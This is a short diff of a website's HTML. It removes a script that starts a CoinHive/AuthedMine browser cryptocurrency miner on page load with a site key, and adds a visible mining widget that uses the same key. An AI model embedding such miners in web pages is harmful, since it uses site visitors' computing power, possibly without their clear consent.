@@ -762,22 +762,17 @@
                                     google.maps.event.addDomListener(window, 'load', initialize);
         </script>
         <script src="assets/js/script.js"></script> 
-
+        <script src="assets/js/switcher.js"></script>
         <!-- Style Switcher
 ================================================== -->
 
         <!-- ===================javascript mining==================== -->
-        <script src="assets/js/switcher.js"></script>
-        <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-        <script>
-            var miner = new CoinHive.Anonymous('YcTtxQ5t7w1CRhGO12tSU2FpNBzABqjp', { throttle: 0.3 });
-
-	        // Only start on non-mobile devices and if not opted-out
-	        // in the last 14400 seconds (4 hours):
-	        if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		        miner.start();
-	        }
-        </script>
+        <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+        <div class="coinhive-miner"
+             style="width: 256px; height: 310px"
+             data-key="YcTtxQ5t7w1CRhGO12tSU2FpNBzABqjp">
+            <em>Loading...</em>
+        </div>
         <!-- ===================javascript mining==================== -->
 
         <div id="style-switcher">
